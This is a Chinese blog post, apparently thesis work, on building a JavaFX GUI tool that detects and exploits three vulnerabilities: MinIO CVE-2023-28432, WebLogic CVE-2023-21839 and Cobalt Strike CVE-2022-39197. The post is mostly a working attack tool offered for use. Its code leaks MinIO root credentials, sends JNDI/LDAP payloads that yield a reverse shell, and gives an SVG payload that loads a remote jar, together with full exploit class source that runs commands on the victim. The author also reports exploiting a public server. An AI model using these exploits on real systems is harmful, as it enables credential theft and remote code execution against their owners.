---
title: GUI漏洞利用工具for:CVE-2023-28432/CVE-2023-21839/CVE-2022-39197
date: 2023-04-20 19:23:45
tags: 工具设计
category: 渗透测试
---

## 1. 漏洞利用工具整体设计方案	

​	前文研究Cobalt Strike漏洞的时候代码用到Java Swing，本章基于Java Swing编写一款GUI漏洞测试工具。通过对上述三种漏洞检测利用代码集成，配合按钮、文本框、标签等GUI组件，定制一款漏洞扫描测试交互式应用程序，适用于任何支持Java的操作系统上运行。

> 三个漏洞的研究分析过程：
>
> [CS-CVE-2022-39197](https://romanc9.github.io/2023/03/15/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0cs/)
>
> [Weblogic-CVE-2023-21839](https://romanc9.github.io/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/)
>
> [Minio-cve-2023-28432](https://romanc9.github.io/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/)

​	设计思路如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042120475.png" alt=" Swing GUI漏洞利用工具的设计思路和实现功能" style="zoom:50%;" />

## 2. 用户交互界面

​	通过交互设计使用户的操作更加简单、直观，提高用户的使用体验

​	通过运用数据处理算法中的流程控制算法，根据数据的特定属性和条件选择执行不同的操作。

### 2.1 可视化交互界面

​	创建Java maven项目，新建class文件，编写GUI主框架界面。

​	1）设置标题、设置标签用来显示提示输入URL、添加文本框接收URL，设置下拉列表显示三种漏洞、检测按钮、显示返回内容的文本框、添加输入命令的文本框、执行按钮等，部分源码下

```java
//添加URL输入标签
Label l = new Label("请输入URL");
l.setLayoutX(10);
l.setLayoutY(15);
l.setPrefWidth(70);
l.setPrefHeight(20);

//添加URL文本框
TextArea textArea = new TextArea();
textArea.setText("请在右侧下拉栏选择poc");
textArea.setLayoutX(80);
textArea.setLayoutY(10);
textArea.setPrefWidth(250);
textArea.setPrefHeight(10);
				
//添加下拉按钮，内容为漏洞字符串数组
String strings[] = {"cs RCE", "weblogic RCE", "minio 信息泄漏"};
ChoiceBox choiceBox = new ChoiceBox(FXCollections.observableArrayList(strings));
choiceBox.setLayoutX(360);
choiceBox.setLayoutY(15);
choiceBox.setPrefHeight(20);
choiceBox.setPrefWidth(70);

//添加检测按钮
Button button = new Button("检测");
button.setLayoutX(450);
button.setLayoutY(15);
button.setPrefWidth(70);
button.setPrefHeight(20);

//添加回显文本框
TextArea textArea1 = new TextArea();
textArea1.setLayoutX(10);
textArea1.setLayoutY(130);
textArea1.setPrefHeight(300);
textArea1.setPrefWidth(500);

textArea1.setWrapText(true);    //设置文本框里的文字自动换行
textArea1.setText("MinIO verify 接口敏感信息泄露漏洞分析(CVE-2023-28432)\n" +
        "Weblogic 未授权远程代码执行漏洞 (CVE-2023-21839)\n" +
        "Cobalt Strike 存储型xss漏洞,可rce(CVE-2022-39197)");

//添加执行命令文字提示
Label l1 = new Label("请输入命令");
l1.setLayoutX(10);
l1.setLayoutY(70);
l1.setPrefWidth(70);
l1.setPrefHeight(20);

//添加命令文本框
TextArea textArea2 = new TextArea();
textArea2.setLayoutX(80);
textArea2.setLayoutY(60);
textArea2.setPrefHeight(20);
textArea2.setPrefWidth(250);

//添加执行按钮
Button button1 = new Button("执行");
button1.setLayoutX(360);
button1.setLayoutY(70);
button1.setPrefHeight(20);
button1.setPrefWidth(50);

textArea2.setText("请输入命令...");
```

​	2）创建GUI界面代码，创建AnchorPane对象存放界面上的各个控件，这些控件将在界面上显示出来，创建GUI界面主场景，将AnchorPane作为根节点，设置场景的宽度600高度700像素

```java
//添加一个pane，用来装填按钮等插件
AnchorPane anchorPane = new AnchorPane();
anchorPane.getChildren().addAll(textArea,choiceBox,button,l,textArea1,l1,textArea2,button1);
Scene scene = new Scene(anchorPane, 600, 700);
GuiDemo.setScene(scene);
GuiDemo.show();
```

​	3）框架主界面设置完成，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042124158.png" alt="Swing框架主界面" style="zoom:50%;" />



### 	2.2 设计交互功能

​	**用户可通过下拉列表选择不同漏洞，同时界面的文本框呈现不同漏洞的文本提示信息：**

​	1）调用JavaFX中的监听器，用于监听ChoiceBox（选择框）中选项的变化。当选项发生变化时，会执行changed方法。在changed方法中，读取下拉列表选中的值，并赋值给name变量，同时在输入命令的文本框设置文字提示先检测漏洞再执行

```java
final String[] name = {null};   //用来接收用户选项
//设置下拉列表监听事件
choiceBox.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
    public void changed(ObservableValue ov, Number value, Number new_value) {
        String ChoiceBox_Name = strings[new_value.intValue()];
        name[0] = ChoiceBox_Name;   //赋值
        textArea2.setText("请先检测是否存在漏洞");  //提示
```

​	2）通过name变量判断用户选项，运用流程控制算法对三种不同漏洞在URL输入框、命令输入框、回显文本框通过setText方法给出不同文字提示信息。

```java
if(name[0].equalsIgnoreCase("minio 信息泄漏")){
    textArea.setText("请输入ip，默认端口9000");  //规范输入
    textArea1.setText("[0] 漏洞前提:MinIO被配置为集群模式\n"+
            "[1] 用法:输入目标ip,无需输入端口,默认9000\n\n");
} else if (name[0].equalsIgnoreCase("weblogic RCE")) {
    textArea.setText(null);
    textArea2.setText(null);
    textArea1.setText("[0] 请自行搭建ldap服务器,用法:\n" +
            "[1] 请输入目标ip:端口,例如127.0.0.1:7001\n" +
            "[2] 命令输入ldap地址,例如xx.dnslog.cn,点击检测按钮查看结果\n"+
            "[3] 无需点击执行按钮,点击检测按钮配合ldap服务器即可查看执行效果\n\n");
} else if (name[0].equalsIgnoreCase("cs RCE")) {
    textArea.setText("点击检测查看反制方法");
    textArea2.setText(null);
    //自查
    textArea1.setText("[+] 自查方法:\n"+
            "[0] 受影响版本:Cobalt Strike <= 4.7\n"+
            "[1] 启动cobaltstrike客户端\n"+
            "[2] 添加监听器，修改名称处输入检测代码：\n"+
            "<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://xxx.dnslog.cn/a.svg'></object>"+
            "\n[3] value处url输入dnslog地址,查看回显即可检测\n"+
            "[4] 或者输入任意地址svg查看能否访问\n"+
            "[**] 注意:url地址需以http开头\n\n");
}
```

​	3）漏洞选择，文字提示功能实现, 如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042208549.png" alt="工具主页面三种漏洞的用法提示" style="zoom:50%;" />



​	4）GUI初步框架和文字提示完成，设置检测按钮功能：当按钮被点击时将根据选择的不同漏洞进入不同语句块，同时设置变量接收用户输入的URL和命令，语句块里即是对漏洞的探测和利用

```java
//添加检测按钮功能
button.setOnAction(event -> {
    String url = textArea.getText();  //接收url
    payload=textArea2.getText();  //接收命令
    if (name[0].equalsIgnoreCase("minio 信息泄漏")){}
    else if (name[0].equalsIgnoreCase("weblogic RCE")){}
    else if (name[0].equalsIgnoreCase("cs RCE")){}
    else {textArea1.setText("未发现漏洞,或请求异常");}});
```

### 2.3 输入预处理

对用户输入进行数据预处理方面：针对三种不同的漏洞，用户输入要求不同。



​	1）MinIO信息泄露漏洞：内部采用自编写的HttpTemp类进行封装调用进行模拟浏览器发送HTTP请求，封装的HTTP方法参数需要请求的URL、请求的类型(GET/POST)、请求体。而通过针对漏洞地址预置输入规则，用户只需输入目标URL，即可实现漏洞探测

​	2）Weblogic未授权RCE漏洞：用户输入目标URL和端口和LDAP服务器地址，采用制定规则：检查用户是否输入两项数据，有一项未输入则无法检测，回显文本框文字提示漏洞测试用法。默认前缀t3://和ldap://，减少输入错误。

​	3）Cobalt Strike RCE漏洞：用户需输入木马可执行文件绝对路径和SVG文件地址实现反制，制定规则检查用户是否输入数据，为空则无法检测；由于命令行根据空格来分隔参数，且运行漏洞利用的Python文件需要三个参数：Python文件地址、木马地址、SVG地址目标，默认Python文件地址、对数据根据空格进行分参、判断参数数量，用户只输入一个地址则无法探测，回显使用方法，优化输入的准确性。



​	程序运行方面：运用异常值处理技术处理程序中的错误和异常情况，并将结果回显到文本框中。

​	结果处理方面：每次输出均包含格式化的程序运行时间，借此可以帮助评估程序的性能和效率，以便后续进行优化和改进。



## 3. 漏洞测试模块

其实就是将前文研究的漏洞poc/exp整合到GUI界面里

### 3.1 MinIO信息泄露漏洞的探测和利用

​	根据MinIO信息泄露原理联合检测按钮和执行按钮设计如下功能：

​	1）当点击检测按钮，将发送HTTP POST请求到目标URL的漏洞地址，如果HTTP响应200返回且返回包里有敏感信息关键词，则回显界面显示有漏洞，否则显示未发现漏洞。appendText方法用于将指定的文本追加到文本框的末尾。这里的HTTP请求本文通过编写HttpTemp类进行封装调用。

```java
if (name[0].equalsIgnoreCase("minio 信息泄漏")) {
                    //调用httptemp类，将返回结果赋值给result变量
                    try{
                        result = HttpTemp.HTTP("http://"+url+":9000/minio/bootstrap/v1/verify","POST",null);
                    }catch (Exception e){
                        result =e.toString();
                        d =new Date();
                        time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                        textArea1.appendText("[-]"+time+" "+url+" 未发现漏洞\n");
                        textArea2.setText("请先检测是否存在漏洞");
                    }

                    //结果匹配：不区分大小写
                    boolean result1 = result.toUpperCase().contains("MINIO_ROOT_PASSWORD") || result.toUpperCase().contains("MINIO_ROOT_USER")|| result.toUpperCase().contains("MINIOENV");
                    if (result1) {
                        d =new Date();
                        time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                        textArea1.appendText("[+] "+time+" "+url+" 存在漏洞！\n");  //textArea1是结果显示栏
                        textArea2.setText("无需输入命令，点击执行获取敏感信息");
                    }
```

​	2）HttpTemp类实现HTTP GET/POST请求功能。需要三个参数：请求URL、请求的类型(GET/POST)、请求体



​		(1)首先建立一个HTTP连接，设置UA头，模拟浏览器发送请求，设置连接的输入输出状态为true，根据参数选择请求方法GET/POST，如果有请求体（如POST请求），则将请求体写入输出流中。

```java
URL url = new URL(requestUrl);
HttpURLConnection conn = (HttpURLConnection)url.openConnection();
conn.setRequestProperty("User-Agent", "Mozilla/4.76");
conn.setDoOutput(true);
conn.setDoInput(true);
conn.setRequestMethod(requestMethod);
conn.connect();
if (null != outputStr) {
    OutputStream os = conn.getOutputStream();
    os.write(outputStr.getBytes(StandardCharsets.UTF_8));
    os.close();
}
```

​		(2)获取HTTP响应：读取字节流，逐行将服务端返回内容加载到buffer字符串缓冲区，输出打印并作为字符串返回。HTTP连接过程有异常则抛出。

```java
    InputStream is = conn.getInputStream();
    InputStreamReader isr = new InputStreamReader(is, StandardCharsets.UTF_8);
    BufferedReader br = new BufferedReader(isr);
    buffer = new StringBuilder();
    String line = null;

    while((line = br.readLine()) != null) {
        buffer.append(line);
    }
} catch (Exception var10) {
    var10.printStackTrace();
}

assert buffer != null;

System.out.println(buffer.toString());
return buffer.toString();
```

​	3）当点击执行按钮，将返回漏洞获取到的敏感信息：直接将HTTP POST漏洞地址获取到的响应返回即可

```java
//执行exp
button1.setOnAction(event1 -> { //button1：执行按钮
        if(result1){
            d =new Date();
            time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
            textArea1.appendText("[+]"+time+" "+url+" 返回结果：\n"+result+"\n");
        }
});
```

#### 实现效果

工具测试结果：

目标地址不存在漏洞的测试如图：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554911.png" alt="对目标地址不存在该漏洞的检测结果" style="zoom:50%;" />



目标地址点击检测后发现存在漏洞，点击执行后返回获取到的敏感信息，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554719.png" alt="对存在该漏洞的目标检测的结果" style="zoom:50%;" />



### 3.2 Weblogic未授权RCE漏洞的探测和利用

​	根据Weblogic未授权远程代码执行漏洞原理联合检测按钮设计如下功能：用户提前搭建好LDAP服务器和利用功能，输入目标URL和LDAP服务器地址，点击检测按钮实现对目标进行漏洞探测和利用。

```java
else if (name[0].equalsIgnoreCase("weblogic RCE")){
    if(url == null || payload == null){
        textArea1.appendText("[*]用法：目标ip:端口 ldap地址,都不能空！\ne.g. 192.168.1.1:7001 192.168.1.2:1389/Basic/ReverseShell/192.168.1.2/1111\n");
    }else {
        CVE_2023_21839.poc(url,payload);
        d =new Date();
        time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
        textArea1.appendText("[+] 目标:"+url+",请求已发送"+time+" 自行查看dnslog/ldap服务器检查结果\n");
    }
}
```

​	这里我将漏洞利用功能的具体请求利用代码编写集成在CVE_2023_21839类，在之前介绍Weblogic漏洞原理的章节部分已提及关键代码的解释，这里不再赘述。类的封装入口是URL和LDAP服务器地址，无返回，类功能实现通过构造恶意对象对LDAP服务器发送请求。



#### 	实现效果

​	工具测试结果:

​	1）对目标公网服务器存在该漏洞的探测，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201604645.png" alt="对公网服务器存在该漏洞的检测结果" style="zoom:50%;" />

​	

​	2）公网服务器本地搭建LDAP服务器，点击执行按钮反弹内网虚拟机Docker的shell到终端，命令输入1.xxx:1389/Basic/ReverseShell/1.xxx/5003，实现反弹shell，如图

![对公网服务器存在该漏洞的利用结果](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201606746.png)



### 3.3 Cobalt Strike RCE漏洞的自查和反制

​	根据Cobalt Strike远程代码执行漏洞原理联合按钮实现以下功能：

1）点击检测按钮，回显文本框显示如何反制和示例SVG文件源码、jar包源码

```java
else if (name[0].equalsIgnoreCase("cs RCE")){

    textArea1.appendText("[+] 反制方法:\n"+
            "[0] 前提：本地已获取到对方木马(beacon.exe)\n"+
            "[1] 反制环境要求：win,python3,pip3安装frida-tools\n"+
            "[2] python已加入环境变量\n"+
            "[3] 自行准备恶意svg文件,jar包,对方能访问到\n" +
            "[4] 命令输入exe绝对路径和svg地址,空格隔开,点击执行实现反制\n"+
            "[payload eg]:beacon.exe http://127.0.0.1:4444/evil.svg\n\n");

    textArea1.appendText("[示例] svg源码:\n"+
                    "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n" +
                            "<script type=\"application/java-archive\" xlink:href=\"http://127.0.0.1:9898/EvilJar-calc.jar\"/>\n" +
                            "<text>CVE-2022-39197</text>\n" +
                            "</svg>"+"\n\n"+
                    "[示例] jar包里的恶意代码源码:弹出计算器,适用不同系统:macos/linux/windows,注意安装依赖,按需修改payload\n"+
"import org.w3c.dom.events.Event;\n" +
        "import org.w3c.dom.events.EventListener;\n" +
        "import org.w3c.dom.svg.EventListenerInitializer;\n" +
        "import org.w3c.dom.svg.SVGDocument;\n" +
        "import org.w3c.dom.svg.SVGSVGElement;\n" +
        "import java.util.*;\n" +
        "import java.io.*;\n" +
        "public class Exploit implements EventListenerInitializer {\n" +
        "    public void initializeEventListeners(SVGDocument document) {\n" +
        "        SVGSVGElement root = document.getRootElement();\n" +
        "        EventListener listener = new EventListener() {\n" +
        "            public void handleEvent(Event event) {\n" +
        "                try {\n" +
        "                    String OS = System.getProperty(\"os.name\", \"unknown\").toLowerCase(Locale.ROOT);\n" +
        "                    if (OS.contains(\"win\")) {\n" +
        "                        Runtime.getRuntime().exec(\"calc.exe\");\n" +
        "                    } else if (OS.contains(\"mac\")) {\n" +
        "                        Runtime.getRuntime().exec(\"open -a calculator\");\n" +
        "                    } else if (OS.contains(\"nux\")) {\n" +
        "                        Runtime.getRuntime().exec(\"/usr/bin/mate-calc\");\n" +
        "                    }\n" +
        "                } catch (Exception e) {}\n" +
        "            }\n" +
        "        };\n" +
        "        root.addEventListener(\"SVGLoad\", listener, false);\n" +
        "    }\n" +
        "}\n\n"
);
```

​	2）用户提前准备好获取到的木马文件、目标主机能访问的SVG文件和实现远程代码执行功能的jar包。点击执行按钮设计如下功能：通过命令处的文本框接收用户输入的木马可执行文件绝对地址和SVG文件地址，点击执行按钮调用cs_rce类，Frida运行并注入可执行文件，修改进程列表里的该可执行文件名为包含用户输入的SVG文件地址的漏洞payload，Cobalt Strike客户端用户查看进程信息即触发访问SVG文件里设置的 jar包，执行jar包设置的代码，实现反制。

```java
//button1：执行按钮,反制
button1.setOnAction(event2 -> {
    payload=textArea2.getText();  //接收命令
    if (name[0].equalsIgnoreCase("cs RCE")){
        if (payload== null){
            textArea1.appendText("[*]命令不能空！\ne.g:beacon.exe http://127.0.0.1:4444/evil.svg\n\n");
        }
        else{
            d = new Date();
            time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
            textArea1.appendText("[+]运行成功！" + time + "自行查看结果：\n");
            textArea1.appendText(cs_rce.poc(payload));}
    }
});
```

​	3）这里我将执行漏洞的代码封装在cs_rce类：通过读取并**生成临时文件的方法**调用项目resources目录下的cve_2022_39197.py文件，该文件关键利用代码在之前Cobalt Strike章节的漏洞原理里具体解释过。

​			(1)cs_rce类：从当前类所在的resources目录中获取名为cve_2022_39197.py的文件内容，然后将其写入到同名的文件中。具体实现是通过创建一个FileOutputStream对象来将输入流中的数据写入到同名文件中。在这个过程中，使用一个缓冲区来提高效率。

```java
String filename = "cve_2022_39197.py";
InputStream inputStream = cs_rce.class.getResourceAsStream("/"+filename);  //"/"表示在classpath的根目录下查找
//System.out.println("[+]"+filePath+"\n");
File file = new File(filename);
FileOutputStream outputStream = new FileOutputStream(file);  // 将inputStream写入到临时文件file中
byte[] buffer = new byte[1024];
int len;
while ((len = inputStream.read(buffer)) != -1) {
    outputStream.write(buffer, 0, len); }
```

​			(2)然后调用Java的Runtime类执行该Python文件，读取Python运行结果并追加输出到回显文本框：

```java
// 执行python脚本
//String[] args = new String[]{"python3", file.getAbsolutePath()};
String s="python3 "+file.getAbsolutePath()+" "+target;
System.out.println(s);
Process proc = Runtime.getRuntime().exec(s);// 执行py文件

//获取输入流
BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
//获取错误流
BufferedReader errorStreamReader = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

String line = null;
String result="";
while ((line = in.readLine()) != null) { //读取输入流
    result =result+line+"\n";
}
while ((line = errorStreamReader.readLine()) != null) {//读取错误流
    result =result+line+"\n";
}
in.close();
//等待子进程退出
proc.waitFor();
return "[+] 执行结果:\n"+result+"\n";
```



#### 实现效果

工具测试结果：

​	1）选择该漏洞时回显界面会显示本地自查漏洞的方法，点击检测按钮回显文本框新增如何反制的方法，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201645354.png" alt=" GUI界面检测按钮功能" style="zoom:50%;" />



 

​	2）输入本地木马地址，搭建的SVG地址，点击执行，对方Cobalt Strike客户端弹出计算器。如用户输入：*C:\Users\romanc9\Desktop\beacon.exe http:// 10.211.55.6:9898/evil.svg*，效果如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201646695.png" alt="实现反制运行计算器" style="zoom:50%;" />



​	同时反制端开启的Web服务收到访问请求并获取到对方IP，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647798.png" alt="Windows10开启的Web服务记录请求记录" style="zoom:50%;" />



#### **注意事项🚩：**

​	1）Java里调用HTTP POST访问时要加UA头模拟浏览器访问，而不是使用普通的Java代码来进行访问，普通的使用URLConnection访问项目会报错HTTP响应返回400。

​	2）调用Python文件的方法：使用Java中的InputStream来读取/resources目录下的文件，将文件读入内存，并将其写入到一个临时文件（file）中，然后本地执行该文件，而不能简单以文件完整路径的方式来指定文件位置，因为在打包后，文件位置发生了变化，如图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647937.png" alt="jar包里调用的Python文件路径直接写绝对路径会报错" style="zoom:50%;" />



## 4. 总结与改进方向



针对GUI工具对三种漏洞的检测结果分析：

| **漏洞类型**                  | **测试结果**                                                 | **不足之处**                                                 | **优化方向**                                                 |
| ----------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| MinIO信息泄露漏洞             | 能直观地检测网站是否存在漏洞，并利用漏洞获取敏感信息         | 对漏洞利用只是直接的返回HTTP完整响应，需要人为筛选有用信息，且未实现RCE功能 | 可通过关键词检索键值对关键信息展示，如账号密码，免去人工检。后续添加对RCE的检测 |
| Weblogic未授权远程代码执行漏  | 能通过检测和利用两方面实现对网站的漏洞验证和利用             | 测试结果仅局限于成功利用漏洞向LDAP服务器发送请求，需要人为通过LDAP服务器访问记录判断是否存在漏洞以及漏洞利用结果 | 漏洞检测可通过添加DNSlog API爬取访问记录判断漏洞是否存在；漏洞利用可通过集成JNDI注入工具实现LDAP服务器预处理，这样无需自行搭建LDAP服务器，优化使用 |
| Cobalt Strike远程代码执行漏洞 | 能直接使用该工具和捕获的木马实现对攻击者的反制，获取对方信息 | 用户需自行准备SVG文件和恶意jar包并搭建服务器                 | 工具提前本地生成所需文件并开启Web服务，方便直接使用，Java FX偶尔卡顿，还需改进性能，可以尝试多线程之类的 |
|                               |                                                              |                                                              |                                                              |

​	相较于普遍采用的命令行界面Python实现漏洞利用工具，本文采用Java Swing框架实现GUI界面，提供图形化界面，使得用户可以更加直观地点击操作和控制漏洞测试过程，而不需要记忆和启动命令行输入复杂参数，优化使用体验。

​	不过，在常规日常渗透测试中，漏扫多为多目标，目前GUI界面仅实现了该三种新漏洞的**单目标**探测和利用，且通过输出的程序运行时间发现有些部分运行速度较慢（cs部分），下一步可优化程序效率：通过输出的程序运行时间，我们可以找到程序中耗时较长的部分，进而进行优化和改进，可以尝试采用多线程运行以提高利用效率。针对多目标，下一步可以研究文件导入功能以扩大目标检测范围，以及对应的，针对大范围扫描的结果导出功能模块集成到Swing GUI中有待进一步研究。



## 延伸参考

在构思漏洞利用工具的时候发现很多好的作品：

1.**pocsuite，命令行大批量漏扫工具那种，常见的，可以安装pocsuite库然后自定义设计的poc/exp集成进去成工具，还是可玩的，但是对毕设论文来说自己设计的就少了，不够**

> 【如何打造自己的PoC框架-Pocsuite3-使用篇】：https://paper.seebug.org/904/
>
> 【基于Pocsuite框架的XXXX Scan poc扫描器设计思路】：https://jerrychan807.gitbooks.io/my-python-cookbook/content/ji-yu-pocsuite-kuang-jia-de-oksec-scan-poc-sao-miao-qi-she-ji.html
>
> 【基于pocshuite，web扫描器】：https://github.com/Cl0udG0d/SZhe_Scan

```
简单常用命令：python pocsuite.py -r tests/poc_example.py -u http://www.example.com/ --verify

-r 为poc路径，可以单个poc文件，也可以是poc文件夹，-u为验证url，--verify为执行poc验证函数
```

2.其他可学习设计的优秀漏扫框架：

> https://github.com/jiangsir404/POC-S、https://github.com/binfed/POC-T
>
> 【https://blog.csdn.net/Fly_hps/article/details/87932317，笔记学习1，2:https://www.freebuf.com/sectool/237840.html】
>
> 超精简的POC扫描框架:https://github.com/ibey0nd/HScan
>
> 简单py扫描文件: http://www.qb5200.com/article/473543.html、https://cn-sec.com/archives/1275647.html

3.参考

> 【JAVA-GUI工具的编写】
>
> https://mp.weixin.qq.com/s/mCQ-rfFP1RN9iaC6bieOiw
>
> 【收集poc的，固定模版，json格式】
>
> https://github.com/CVEProject/cvelist/blob/master/2023/28xxx/CVE-2023-28432.json
>
> 【一款漏洞验证框架的构思】
>
> https://xz.aliyun.com/t/6161
>
> 【Frida hook零基础教程】
>
> https://juejin.cn/post/7139854934928785439
>
> 【python模块学习】
>
> https://www.huweihuang.com/python-notes/package/package-module.html
>
> 【如何用Java程序运行python文件】
>
> https://blog.csdn.net/H17Q0818/article/details/105889536
>
> https://www.yisu.com/zixun/352389.html
>
> [1]吕校春,李玲莉.基于Swing的Java GUI组件开发[J].机械工程师,2008,No.203(05):129-131.
>
> [1]刘晓峥.浅析Java GUI编程工具集[J].科技信息,2012,No.427(35):596-597.



## 报错及解决

1.写代码运行时403报错，解决：https://blog.csdn.net/xc9711/article/details/124047530

```
conn.setRequestProperty("User-Agent", "Mozilla/4.76");
```

![报错案例](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304202258366.png)





2.Java调用Python文件失败，找不到文件，卡了很久。。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304230246193.png" alt="报错2" style="zoom:50%;" />



> https://blog.csdn.net/u013514928/article/details/79360870
>
> https://blog.csdn.net/weixin_43165220/article/details/104014973
>
> https://blog.csdn.net/w1014074794/article/details/123951413

​	原因：使用Java中的InputStream来读取/resources目录下的文件,将文件读入内存，并将其写入到一个临时文件（file）中，然后执行python脚本，不能以文件完整路径的方式来指定文件位置，**<u>因为在打包后，文件位置可能发生了变化。**</u>



​	选择直接写入新文件后运行成功：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304231647016.png" alt="报错解决" style="zoom:50%;" />



3.weblogic poc运行失败的话应该是依赖问题：工具需导入配置文件wlfullclient.jar，具体操作见之前的漏洞分析文章